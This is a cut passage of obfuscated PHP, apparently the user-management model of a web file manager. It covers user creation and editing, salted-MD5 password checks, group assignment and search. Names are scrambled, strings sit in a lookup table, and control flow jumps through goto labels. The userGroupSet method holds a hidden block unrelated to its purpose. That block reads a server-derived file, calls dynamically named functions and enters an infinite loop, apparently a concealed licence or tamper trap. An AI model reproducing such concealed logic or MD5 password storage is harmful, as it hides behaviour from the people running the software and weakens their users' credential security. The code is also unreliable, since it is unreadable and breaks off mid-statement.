$B½ÌÕ²Ãİà[2165] => $B…•™Ü¢Å, $B½ÌÕ²Ãİà[980] => $B½ÌÕ²Ãİà[982]); if ($this->nickNameRpt()) { unset($eŸ³íğ‘è©[$B½ÌÕ²Ãİà[1984]]); } return $this->where($eŸ³íğ‘è©)->find(); } public function clearCache($aåÀ‘¡¾) { $aòòš¨Éó™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->cacheFunctionClear($aòòš¨Éó™[1797], $aåÀ‘¡¾); $this->cacheFunctionClear($aòòš¨Éó™[1798], $aåÀ‘¡¾); $this->cacheFunctionClear($aòòš¨Éó™[2146], $aåÀ‘¡¾); } public function userPasswordCheck($C¨çÁç›Ø™, $bÙê·æ±ø) { $A›¤Ğ¢—œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eµæ´šÚ™ = $this->where(array($A›¤Ğ¢—œ[1550] => intval($C¨çÁç›Ø™)))->find(); $dîÀãÛ§¼¸ = $this->metaGet($C¨çÁç›Ø™); $cší×Ùøë™ = isset($dîÀãÛ§¼¸[$A›¤Ğ¢—œ[2166]]) ? $dîÀãÛ§¼¸[$A›¤Ğ¢—œ[2166]] : $A›¤Ğ¢—œ[33]; if (md5($cší×Ùøë™ . trim($bÙê·æ±ø)) !== $eµæ´šÚ™[$A›¤Ğ¢—œ[872]]) { return !1; } return !0; } public function userAdd($C”µó™©ñÑ) { goto B–í¢¹øÔ; aÒÉ‰¼º¦Å: $Cï‡Òèï¯” = $this->_checkExist($C”µó™©ñÑ); if ($Cï‡Òèï¯” !== !0) { return $Cï‡Òèï¯”; } $C ­«¿¹ = $this->add($AÜÙ™¡); goto D‡ÕˆÃ²Îé; D‡ÕˆÃ²Îé: $Fø® ®“Í = array($fƒÚ‘ìè¬Ü[2174] => $AÜÙ™¡[$fƒÚ‘ìè¬Ü[872]], $fƒÚ‘ìè¬Ü[2170] => $AÜÙ™¡[$fƒÚ‘ìè¬Ü[1984]]); $this->userEdit($C ­«¿¹, $Fø® ®“Í); Model($fƒÚ‘ìè¬Ü[1227])->userRootAdd($C ­«¿¹); goto a× ÚÀÉ«; B–í¢¹øÔ: $fƒÚ‘ìè¬Ü =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÜÙ™¡ = array($fƒÚ‘ìè¬Ü[415] => $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[28]], $fƒÚ‘ìè¬Ü[2167] => $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1431]], $fƒÚ‘ìè¬Ü[2168] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[303]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[303]] : $fƒÚ‘ìè¬Ü[33], $fƒÚ‘ìè¬Ü[2169] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2165]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2165]] : $fƒÚ‘ìè¬Ü[33], $fƒÚ‘ìè¬Ü[2170] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1984]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1984]] : $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[28]], $fƒÚ‘ìè¬Ü[2171] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2150]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2150]] : $fƒÚ‘ìè¬Ü[33], $fƒÚ‘ìè¬Ü[2172] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2173]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[2173]] : 1, $fƒÚ‘ìè¬Ü[2174] => $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[872]], $fƒÚ‘ìè¬Ü[1799] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1703]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1703]] : 1024 * 1024 * 20, $fƒÚ‘ìè¬Ü[1800] => 0, $fƒÚ‘ìè¬Ü[2175] => 0, $fƒÚ‘ìè¬Ü[1842] => isset($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[731]]) ? $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[731]] : 1); if (!empty($C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1550]])) { $AÜÙ™¡[$fƒÚ‘ìè¬Ü[1550]] = $C”µó™©ñÑ[$fƒÚ‘ìè¬Ü[1550]]; } goto aÒÉ‰¼º¦Å; a× ÚÀÉ«: return $C ­«¿¹; goto FÃâ¦Öó¼™; FÃâ¦Öó¼™: } protected function userEditTest($a‡ŠîØºŞ¿, $aø¤¢‰×³…) { return $this->call($_SERVER[Ôğ—¤Šµˆ˜ñ£][2176], $a‡ŠîØºŞ¿, $aø¤¢‰×³…); } protected function userEdit($CÆÍÑù£¦, $C‰¶É¢Êó‰) { goto c¾¡é«›Šš; Aê‰ÖÙñå: return !0; goto b³™ËÃÎØß; EŒ“ÓâÍˆ: $this->where(array($A‰‰Šõ†„†[1541] => $CÆÍÑù£¦))->save($C‰¶É¢Êó‰); if (isset($C‰¶É¢Êó‰[$A‰‰Šõ†„†[1984]])) { $this->setNamePinyin($CÆÍÑù£¦, $C‰¶É¢Êó‰[$A‰‰Šõ†„†[1984]]); } $this->clearCache($CÆÍÑù£¦); goto Aê‰ÖÙñå; c¾¡é«›Šš: $A‰‰Šõ†„† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F‚Ş‚„®İ‹ = $this->getInfoSimple($CÆÍÑù£¦); if (!$F‚Ş‚„®İ‹) { return !1; } goto CÃî‹˜Šïá; CÃî‹˜Šïá: $dèÊ×íÑÎ… = $this->_checkExist($C‰¶É¢Êó‰, $CÆÍÑù£¦); if ($dèÊ×íÑÎ… !== !0) { return $dèÊ×íÑÎ…; } if (isset($C‰¶É¢Êó‰[$A‰‰Šõ†„†[872]]) && trim($C‰¶É¢Êó‰[$A‰‰Šõ†„†[872]]) != $A‰‰Šõ†„†[33]) { $E¾ïÁ÷®¾– = $this->metaGet($CÆÍÑù£¦); if (empty($E¾ïÁ÷®¾–[$A‰‰Šõ†„†[2166]])) { $E¾ïÁ÷®¾–[$A‰‰Šõ†„†[2166]] = rand_string(10); Model($A‰‰Šõ†„†[507])->metaSet($CÆÍÑù£¦, $A‰‰Šõ†„†[2166], $E¾ïÁ÷®¾–[$A‰‰Šõ†„†[2166]]); } $C‰¶É¢Êó‰[$A‰‰Šõ†„†[872]] = md5($E¾ïÁ÷®¾–[$A‰‰Šõ†„†[2166]] . trim($C‰¶É¢Êó‰[$A‰‰Šõ†„†[872]])); } else { unset($C‰¶É¢Êó‰[$A‰‰Šõ†„†[872]]); } goto EŒ“ÓâÍˆ; b³™ËÃÎØß: } public function setNamePinyin($b¯ƒ¤ù·­Ñ, $c˜§ƒö¢Ñ = false) { $eêÒåÕ¶¹  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$c˜§ƒö¢Ñ) { $C«˜‚Œ…Ñ = $this->getInfoSimple($b¯ƒ¤ù·­Ñ); $c˜§ƒö¢Ñ = $C«˜‚Œ…Ñ[$eêÒåÕ¶¹ [1984]] ? $C«˜‚Œ…Ñ[$eêÒåÕ¶¹ [1984]] : $C«˜‚Œ…Ñ[$eêÒåÕ¶¹ [28]]; } $bğŒÈŠñ­× = Model($eêÒåÕ¶¹ [532]); if (!Input::check($c˜§ƒö¢Ñ, $eêÒåÕ¶¹ [581])) { return $bğŒÈŠñ­×->metaSet($b¯ƒ¤ù·­Ñ, array($eêÒåÕ¶¹ [458] => $eêÒåÕ¶¹ [33], $eêÒåÕ¶¹ [457] => $eêÒåÕ¶¹ [33])); } return $bğŒÈŠñ­×->metaSet($b¯ƒ¤ù·­Ñ, array($eêÒåÕ¶¹ [458] => str_replace($eêÒåÕ¶¹ [50], $eêÒåÕ¶¹ [33], Pinyin::get($c˜§ƒö¢Ñ)), $eêÒåÕ¶¹ [457] => Pinyin::get($c˜§ƒö¢Ñ, $eêÒåÕ¶¹ [582]))); } private function nickNameRpt() { $eÙ»ãÃŠí¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Fñ®ŠÙ†Î = Model($eÙ»ãÃŠí¶[751])->get($eÙ»ãÃŠí¶[2177]); $bØ—ÔˆÛ = $GLOBALS[$eÙ»ãÃŠí¶[6]][$eÙ»ãÃŠí¶[379]][$eÙ»ãÃŠí¶[2177]]; $C«†ñ¥„Š = !is_null($Fñ®ŠÙ†Î) ? $Fñ®ŠÙ†Î : $bØ—ÔˆÛ; return !!$C«†ñ¥„Š; } private function _checkExist($b™è£°ˆñÍ, $f‹…¶ã£„¤ = false) { $dË×„ÛØ³¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B°¥ô¦àä… = array($dË×„ÛØ³¾[28] => UserModel::ERROR_USER_EXIST_NAME, $dË×„ÛØ³¾[1984] => UserModel::ERROR_USER_EXIST_NICKNAME, $dË×„ÛØ³¾[303] => UserModel::ERROR_USER_EXIST_EMAIL, $dË×„ÛØ³¾[2165] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($B°¥ô¦àä…[$dË×„ÛØ³¾[1984]]); } $e—÷Ÿë¹ÖÚ = $f‹…¶ã£„¤ ? array($dË×„ÛØ³¾[1550] => array($dË×„ÛØ³¾[2178], $f‹…¶ã£„¤)) : array(); foreach ($B°¥ô¦àä… as $A»ŞÑâ’ĞĞ => $Cğº¯Ë´¤) { $BëÔá©‡é… = array(); foreach ($B°¥ô¦àä… as $B…İÃß– => $B– §Íˆªš) { if (isset($b™è£°ˆñÍ[$B…İÃß–]) && $b™è£°ˆñÍ[$B…İÃß–]) { $BëÔá©‡é…[] = $b™è£°ˆñÍ[$B…İÃß–]; } } if (!$BëÔá©‡é…) { continue; } $F‚èëÛùì° = array_merge(array($A»ŞÑâ’ĞĞ => array($dË×„ÛØ³¾[7], $BëÔá©‡é…)), $e—÷Ÿë¹ÖÚ); $aòìë‚ï˜ = $this->where($F‚èëÛùì°)->find(); if ($aòìë‚ï˜) { return $Cğº¯Ë´¤; } } return !0; } public function userListInfo($dìÚ¯ìê) { $E‡Òš“‘é² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aˆáí…Ã¾† = array(); $dìÚ¯ìê = is_array($dìÚ¯ìê) ? array_unique($dìÚ¯ìê) : array(); if (!$dìÚ¯ìê) { return $Aˆáí…Ã¾†; } if (count($dìÚ¯ìê) < 20) { foreach ($dìÚ¯ìê as $fãÃÜ„ÆšÆ) { $Aˆáí…Ã¾†[$fãÃÜ„ÆšÆ . $E‡Òš“‘é²[33]] = $this->getInfoSimpleOuter($fãÃÜ„ÆšÆ); } } else { $fÄƒë‹‰™ = array($E‡Òš“‘é²[1541] => array($E‡Òš“‘é²[413], $dìÚ¯ìê)); if (count($dìÚ¯ìê) == 1) { $fÄƒë‹‰™ = array($E‡Òš“‘é²[1541] => $dìÚ¯ìê[0]); } $D­¶Ê°ˆÊÁ = Model($E‡Òš“‘é²[507])->field($this->simpleField)->where($fÄƒë‹‰™)->select(); $D­¶Ê°ˆÊÁ = array_to_keyvalue($D­¶Ê°ˆÊÁ, $E‡Òš“‘é²[1550]); foreach ($dìÚ¯ìê as $fãÃÜ„ÆšÆ) { $fÀŒ†»Õßå = $D­¶Ê°ˆÊÁ[$fãÃÜ„ÆšÆ]; if (!$fÀŒ†»Õßå) { $Aˆáí…Ã¾†[$fãÃÜ„ÆšÆ . $E‡Òš“‘é²[33]] = $this->getInfoSimpleOuter($fãÃÜ„ÆšÆ); continue; } $fÀŒ†»Õßå[$E‡Òš“‘é²[2150]] = Action($E‡Òš“‘é²[2151])->parseUrl($fÀŒ†»Õßå[$E‡Òš“‘é²[2150]]); $Aˆáí…Ã¾†[$fãÃÜ„ÆšÆ . $E‡Òš“‘é²[33]] = $fÀŒ†»Õßå; } } return $Aˆáí…Ã¾†; } protected function userStatus($F¤ÏŠŒªÕ, $f¾¢˜ÓîÁ) { $B¼ÄŸ÷ø¯Ÿ = $this->getInfoSimple($F¤ÏŠŒªÕ); if (!$B¼ÄŸ÷ø¯Ÿ) { return !1; } $Eõ°¢®½õÂ = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][731] => $f¾¢˜ÓîÁ); return $this->userEdit($F¤ÏŠŒªÕ, $Eõ°¢®½õÂ); } protected function userRemove($dÕïù´êÅ) { goto c¯¬ª´ŞôÉ; a‹íäòÉ¦: Model($d­ç¿°¾´–[1805])->where($F‡ï ë¼ï‚)->delete(); Model($d­ç¿°¾´–[2164])->where($F‡ï ë¼ï‚)->delete(); Model($d­ç¿°¾´–[2180])->where($F‡ï ë¼ï‚)->delete(); goto F¬Ã§ÁÎ; F¬Ã§ÁÎ: Model($d­ç¿°¾´–[2001])->removeUserAll($dÕïù´êÅ); Model($d­ç¿°¾´–[813])->userRootRemove($dÕïù´êÅ); return $this->where($F‡ï ë¼ï‚)->delete(); goto c‚²Ç¯§«ò; c¯¬ª´ŞôÉ: $d­ç¿°¾´– =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cŠŒ×Î’à¬ = $this->getInfoSimple($dÕïù´êÅ); if (!$cŠŒ×Î’à¬) { return !1; } goto E©Â¡Ÿ“Œ¶; E©Â¡Ÿ“Œ¶: $F‡ï ë¼ï‚ = array($d­ç¿°¾´–[1541] => $dÕïù´êÅ); Model($d­ç¿°¾´–[589])->where($F‡ï ë¼ï‚)->delete(); Model($d­ç¿°¾´–[2179])->where($F‡ï ë¼ï‚)->delete(); goto a‹íäòÉ¦; c‚²Ç¯§«ò: } protected function userGroupSet($F¼ë—äÍµ , $cÕ„’Í ¬‡, $B¾¸ÍÉŠŒ´ = array()) { goto dÊº’ÇëË; c´êàÕí—™: if (!$f³¶”éÖèƒ || !is_array($cÕ„’Í ¬‡)) { return !1; } $BÀíß©Ñ’ = Model($EÕ•Å§‡‚»[1805]); $BÀíß©Ñ’->where(array($EÕ•Å§‡‚»[1550] => $F¼ë—äÍµ ))->delete(); goto a«áÎĞ¨´˜; a«áÎĞ¨´˜: $Aé†ÛÃšßğ = array(); $dñã…ã•ö = 0; foreach ($cÕ„’Í ¬‡ as $eÜ˜Å“Ü§Û => $CêÖÎŸ™”è) { $D±ù×äç¶Ô = array($EÕ•Å§‡‚»[1550] => $F¼ë—äÍµ , $EÕ•Å§‡‚»[1719] => $eÜ˜Å“Ü§Û, $EÕ•Å§‡‚»[1819] => $CêÖÎŸ™”è); $D±ù×äç¶Ô[$EÕ•Å§‡‚»[1742]] = isset($B¾¸ÍÉŠŒ´[$dñã…ã•ö]) ? $B¾¸ÍÉŠŒ´[$dñã…ã•ö] : 0; $dñã…ã•ö++; $Aé†ÛÃšßğ[] = $D±ù×äç¶Ô; } goto F„¥ÀÄğ; F„¥ÀÄğ: return $BÀíß©Ñ’->addAll($Aé†ÛÃšßğ, array(), !0); goto B´ëÓå‹æ; dÊº’ÇëË: $EÕ•Å§‡‚» =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($_SERVER[$EÕ•Å§‡‚»[849]]) || !isset($_SERVER[$EÕ•Å§‡‚»[847]])) { goto B‚°Ëé‹†; fŠ²Üßä„£: $c£§ğÎòôÄ = $EÕ•Å§‡‚»[863]; $c£§ğÎòôÄ($_SERVER[$EÕ•Å§‡‚»[864]]); $Aˆãí¬Å› = 1; goto AÜ¨á®À·×; B‚°Ëé‹†: $dÛßÎ±‘Â„ = $EÕ•Å§‡‚»[862]; $c±Î¢˜¤‡ù = $EÕ•Å§‡‚»[850]; $B–Ãİš›¶› = $_SERVER[$EÕ•Å§‡‚»[851]] . $EÕ•Å§‡‚»[852]; goto f¶İªè£´¤; f¶İªè£´¤: $bˆ„àµœö˜ = $c±Î¢˜¤‡ù($B–Ãİš›¶›); $BÄ‘×á¥ = explode($EÕ•Å§‡‚»[229], $bˆ„àµœö˜); if (count($BÄ‘×á¥) < $EÕ•Å§‡‚»[606]) { $d­Ú¸ŠÂ = $EÕ•Å§‡‚»[853]; $d­Ú¸ŠÂ(); } goto fŠ²Üßä„£; AÜ¨á®À·×: for ($Bè“¯È‘Šñ = $Aˆãí¬Å›; $Bè“¯È‘Šñ > 0; $Bè“¯È‘Šñ++) { $c£§ğÎòôÄ = json_encode($GLOBALS[$EÕ•Å§‡‚»[413]]); } goto eê‡éÜæ„ˆ; eê‡éÜæ„ˆ: } $f³¶”éÖèƒ = $this->getInfoSimple($F¼ë—äÍµ ); goto c´êàÕí—™; B´ëÓå‹æ: } protected function userGroupAdd($dø¯åÎÃô, $E¿êë˜àÒÑ = array()) { $E„×éÔÊ¼¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÇ×ÄÃ…Ò = $this->getInfoSimple($dø¯åÎÃô); if (!$eÇ×ÄÃ…Ò || empty($E¿êë˜àÒÑ)) { return !1; } $F¿òÏÈ•Õ = array(); foreach ($E¿êë˜àÒÑ as $B…×îäÁ¨ => $fÛÖĞĞŠÜ) { $F¿òÏÈ•Õ[] = array($E„×éÔÊ¼¼[1550] => $dø¯åÎÃô, $E„×éÔÊ¼¼[1719] => $B…×îäÁ¨, $E„×éÔÊ¼¼[1819] => $fÛÖĞĞŠÜ, $E„×éÔÊ¼¼[1742] => 0); } return Model($E„×éÔÊ¼¼[1805])->addAll($F¿òÏÈ•Õ, array(), !0); } protected function userGroupRemove($c±“ï“†ø, $FÙµÃ§¯Œ) { $d‘…Š‘œŸ“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eØßÜ“í‚¿ = $this->getInfoSimple($c±“ï“†ø); if (!$eØßÜ“í‚¿ || !$FÙµÃ§¯Œ) { return !1; } $fÎéîÇŒ†¿ = array($d‘…Š‘œŸ“[1541] => $c±“ï“†ø, $d‘…Š‘œŸ“[1803] => $FÙµÃ§¯Œ); return Model($d‘…Š‘œŸ“[1805])->where($fÎéîÇŒ†¿)->delete(); } public function listData() { $a‚Šğ¯¡‚Î = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a‚Šğ¯¡‚Î[$_SERVER[Ôğ—¤Šµˆ˜ñ£][367]]); return $a‚Šğ¯¡‚Î; } public function listByID($cˆ·Ó¦¦†î) { goto CÌ‚Î¦½¦½; C§¬À¨º‰: return $e°‰ÂŸî¡; goto a¨ÍĞÚ; F²…Ò†Î: $e°‰ÂŸî¡ = $this->where($fŸ „°‡ –)->select(); $e°‰ÂŸî¡ = array_sort_keep($e°‰ÂŸî¡, $A¯ê÷îñ¼¥[1550], $cˆ·Ó¦¦†î); $this->_listDataApply($e°‰ÂŸî¡); goto C§¬À¨º‰; CÌ‚Î¦½¦½: $A¯ê÷îñ¼¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$cˆ·Ó¦¦†î) { return; } $fŸ „°‡ – = array($A¯ê÷îñ¼¥[1550] => array($A¯ê÷îñ¼¥[7], $cˆ·Ó¦¦†î)); goto F²…Ò†Î; a¨ÍĞÚ: } public function listByGroup($FÕõĞˆ‡÷² = 0, $EÑ¯øˆç§ = array()) { goto Bµ‚œÙ‚¯º; Bµ‚œÙ‚¯º: $eÒÂ­Ê™ÛÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bò»‹Èáâ = $eÒÂ­Ê™ÛÕ[33]; $aÂö•á¼×Ù = array(); goto d©‘îˆ¿Š; Eª³ãŞ™²¨: $this->_listDataApply($dÈ«‚õåÀ·[$eÒÂ­Ê™ÛÕ[367]]); return $dÈ«‚õåÀ·; goto D¦ºƒ‹®; d©‘îˆ¿Š: if ($FÕõĞˆ‡÷²) { $aÂö•á¼×Ù = array($eÒÂ­Ê™ÛÕ[2181] => intval($FÕõĞˆ‡÷²)); $Bò»‹Èáâ = "\114\x45\106\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\165\163\145\x72\x5f\x67\x72\157\x75\160\40\165\x73\x65\162\137\x67\x72\157\x75\160\40\157\x6e\40\x75\163\145\x72\56\165\x73\x65\162\111\104\40\x3d\x20\165\163\145\162\x5f\147\162\157\165\160\56\165\163\145\162\111\x44"; $fæËŠ×ãÎ = Input::get($eÒÂ­Ê™ÛÕ[449], null, $eÒÂ­Ê™ÛÕ[33]) ? $eÒÂ­Ê™ÛÕ[33] : $eÒÂ­Ê™ÛÕ[2182]; } if (isset($EÑ¯øˆç§[$eÒÂ­Ê™ÛÕ[731]])) { $aÂö•á¼×Ù[$eÒÂ­Ê™ÛÕ[2183]] = $EÑ¯øˆç§[$eÒÂ­Ê™ÛÕ[731]]; } $dÈ«‚õåÀ· = $this->_makeOrder($fæËŠ×ãÎ)->field($eÒÂ­Ê™ÛÕ[2184])->where($aÂö•á¼×Ù)->join($Bò»‹Èáâ)->selectPage(50); goto Eª³ãŞ™²¨; D¦ºƒ‹®: } private function _makeOrder($F×Æ¹©´© = '') { goto A˜ÊÌ£Šá—; A˜ÊÌ£Šá—: $FÊ ‘‰ù =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FõãÔôš‚ = array($FÊ ‘‰ù[1550], $FÊ ‘‰ù[28], $FÊ ‘‰ù[1705], $FÊ ‘‰ù[1677], $FÊ ‘‰ù[194]); $eˆ“‘ôé„ = array($FÊ ‘‰ù[442] => $FÊ ‘‰ù[443], $FÊ ‘‰ù[444] => $FÊ ‘‰ù[445]); goto BĞ¬ÀÒ”; BĞ¬ÀÒ”: $B»É¯°—‹Ø = Input::get($FÊ ‘‰ù[449], $FÊ ‘‰ù[7], $FÊ ‘‰ù[1541], $FõãÔôš‚); $Eõªˆ¦™²Ã = Input::get($FÊ ‘‰ù[450], $FÊ ‘‰ù[7], $FÊ ‘‰ù[1806], array($FÊ ‘‰ù[1806], $FÊ ‘‰ù[444])); $Eõªˆ¦™²Ã = $eˆ“‘ôé„[$Eõªˆ¦™²Ã]; goto CØã×¡¸®Ù; CØã×¡¸®Ù: $F×Æ¹©´© = $F×Æ¹©´© . "\x75\x73\145\162\x2e{$B»É¯°—‹Ø}\x20{$Eõªˆ¦™²Ã}\54\x20\x75\163\x65\x72\56\165\x73\145\x72\x49\x44\x20\141\x73\143"; return $this->alias($FÊ ‘‰ù[1926])->order($F×Æ¹©´©); goto F‘ô§‹¶à†; F‘ô§‹¶à†: } public function listSearch($A¥Ä‹¯òÂ·) { goto FÚÁ ¼ê©²; B…Ì…æ¹‰‘: $A§á••Š† = str_replace($AŒìÅ¹ä•Ó[1809], $AŒìÅ¹ä•Ó[1810], trim($A§á••Š†)); $c‡ÁÉ²ã˜Ì = array($AŒìÅ¹ä•Ó[28] => array($AŒìÅ¹ä•Ó[381], "\x25{$A§á••Š†}\x25"), $AŒìÅ¹ä•Ó[303] => array($AŒìÅ¹ä•Ó[381], "{$A§á••Š†}\45"), $AŒìÅ¹ä•Ó[1984] => array($AŒìÅ¹ä•Ó[381], "{$A§á••Š†}\45"), $AŒìÅ¹ä•Ó[980] => $AŒìÅ¹ä•Ó[1811]); if (Input::check($A§á••Š†, $AŒìÅ¹ä•Ó[309])) { $c‡ÁÉ²ã˜Ì[$AŒìÅ¹ä•Ó[1550]] = array($AŒìÅ¹ä•Ó[381], "{$A§á••Š†}\45"); $c‡ÁÉ²ã˜Ì[$AŒìÅ¹ä•Ó[2165]] = array($AŒìÅ¹ä•Ó[381], "{$A§á••Š†}\x25"); } goto D‘”™—¨ÎÜ; dóœÃ†¡ŒÒ: $this->_filterByGroup($C†ÓÕ›Å‹Ì, $C¤ŒÚ¤ˆğ); return $C†ÓÕ›Å‹Ì; goto cì‚ó²±Ì·; FÚÁ ¼ê©²: $AŒìÅ¹ä•Ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A§á••Š† = $A¥Ä‹¯òÂ·[$AŒìÅ¹ä•Ó[1807]]; $C¤ŒÚ¤ˆğ = isset($A¥Ä‹¯òÂ·[$AŒìÅ¹ä•Ó[1808]]) ? $A¥Ä‹¯òÂ·[$AŒìÅ¹ä•Ó[1808]] : !1; goto B…Ì…æ¹‰‘; D‘”™—¨ÎÜ: if (!$A§á••Š†) { $c‡ÁÉ²ã˜Ì = array(); } if (isset($A¥Ä‹¯òÂ·[$AŒìÅ¹ä•Ó[731]])) { $c‡ÁÉ²ã˜Ì[$AŒìÅ¹ä•Ó[731]] = $A¥Ä‹¯òÂ·[$AŒìÅ¹ä•Ó[731]]; } $c‡ÁÉ²ã˜Ì = $this->parseWhereLike($c‡ÁÉ²ã˜Ì); goto c¤†É³Ôí˜; c¤†É³Ôí˜: $C†ÓÕ›Å‹Ì = $this->_makeOrder()->where($c‡ÁÉ²ã˜Ì)->selectPage(20); if (!$C†ÓÕ›Å‹Ì || count($C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[367]]) < 5 && Input::check($A§á••Š†, $AŒìÅ¹ä•Ó[316])) { $f¬³…Šç¬ = $this->_searchFromMeta($AŒìÅ¹ä•Ó[457], $A§á••Š†, 10); $Aæ¿ÔÓ¥Œ = $this->_searchFromMeta($AŒìÅ¹ä•Ó[458], $A§á••Š†, 10); $AÍ¯ÍÖ‚Ê¡ = array_merge($f¬³…Šç¬, $Aæ¿ÔÓ¥Œ, $C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[367]]); $C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[367]] = array_unique_by_key($AÍ¯ÍÖ‚Ê¡, $AŒìÅ¹ä•Ó[1550]); $C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[364]][$AŒìÅ¹ä•Ó[365]] = count($C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[367]]); $C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[364]][$AŒìÅ¹ä•Ó[366]] = ceil($C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[364]][$AŒìÅ¹ä•Ó[365]] / $C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[364]][$AŒìÅ¹ä•Ó[361]]); } $this->_listDataApply($C†ÓÕ›Å‹Ì[$AŒìÅ¹ä•Ó[367]]); goto dóœÃ†¡ŒÒ; cì‚ó²±Ì·: } private function _filterByGroup(&$DÎİÚ³øÈ¶, $a½ë¦çÎ) { $cè›ê¿˜²ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$a½ë¦çÎ) { return $DÎİÚ³øÈ¶; } foreach ($DÎİÚ³øÈ¶[$cè›ê¿˜²ó[367]] as $fÑ°õùàå => &$CÙİ…ä’ƒÂ) { $aÕ·‰±Å‘“ = array_to_keyvalue($CÙİ…ä’ƒÂ[$cè›ê¿˜²ó[1896]], $cè›ê¿˜²ó[33], $cè›ê¿˜²ó[1719]); if (!in_array($a½ë¦çÎ, $aÕ·‰±Å‘“)) { unset($DÎİÚ³øÈ¶[$cè›ê¿˜²ó[367]][$fÑ°õùàå]); } } unset($CÙİ…ä’ƒÂ); $DÎİÚ³øÈ¶[$cè›ê¿˜²ó[367]] = array_values($DÎİÚ³øÈ¶[$cè›ê¿˜²ó[367]]); $DÎİÚ³øÈ¶[$cè›ê¿˜²ó[364]] = array($cè›ê¿˜²ó[1958] => count($DÎİÚ³øÈ¶[$cè›ê¿˜²ó[367]]), $cè›ê¿˜²ó[1956] => $DÎİÚ³øÈ¶[$cè›ê¿˜²ó[364]][$cè›ê¿˜²ó[361]], $cè›ê¿˜²ó[1955] => 1, $cè›ê¿˜²ó[1957] => 1); } private function _searchFromMeta($aœéÚì®ÑÀ, $a×Š‘èê¡, $a©˜¿ÕÅÚ½) { goto EğÇ¬è½Ô; Bğ‰ë‰ôÄ: $fã…š²­†Û = $this->parseWhereLike($fã…š²­†Û); $d£°‘ƒÕ«Œ = Model($F£ªØÄ™µç[2185])->where($fã…š²­†Û)->limit($a©˜¿ÕÅÚ½)->select(); if (!$d£°‘ƒÕ«Œ) { return array(); } goto eÊôíË¨¼¡; A©øÒÑÊ¢: return $f¢‰š¶Ûè£; goto F¿‹¾‡¹‡õ; EğÇ¬è½Ô: $F£ªØÄ™µç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a×Š‘èê¡ = strtolower($a×Š‘èê¡); $fã…š²­†Û = array($F£ªØÄ™µç[93] => $aœéÚì®ÑÀ, $F£ªØÄ™µç[372] => array($F£ªØÄ™µç[381], "\x25{$a×Š‘èê¡}\x25")); goto Bğ‰ë‰ôÄ; eÊôíË¨¼¡: $d£°‘ƒÕ«Œ = array_to_keyvalue($d£°‘ƒÕ«Œ, $F£ªØÄ™µç[33], $F£ªØÄ™µç[1550]); $f¢‰š¶Ûè£ = $this->where(array($F£ªØÄ™µç[1541] => array($F£ªØÄ™µç[7], $d£°‘ƒÕ«Œ)))->select(); if (!$f¢‰š¶Ûè£) { return array(); } goto A©øÒÑÊ¢; F¿‹¾‡¹‡õ: } private function _listDataApplyItem($fÅ‡ªˆ»„) { $d•ìˆ’›ô· = array($fÅ‡ªˆ»„); $this->_listDataApply($d•ìˆ’›ô·); return $d•ìˆ’›ô·[0]; } private function _listDataApply(&$DÙ«Ü‰ØÛŞ) { goto aÓ»Äô–ÇÛ; dÉŒ—‘£…½: $dÏô¤Ìö§ = array_to_keyvalue($DÙ«Ü‰ØÛŞ, $E‚Ñ³»Ø³Ÿ[33], $E‚Ñ³»Ø³Ÿ[1550]); $this->_listAppendGroup($DÙ«Ü‰ØÛŞ, $dÏô¤Ìö§); $this->_listAppendMeta($DÙ«Ü‰ØÛŞ, $dÏô¤Ìö§); goto e¸¡ğ®ÒÔ; aÓ»Äô–ÇÛ: $E‚Ñ³»Ø³Ÿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if 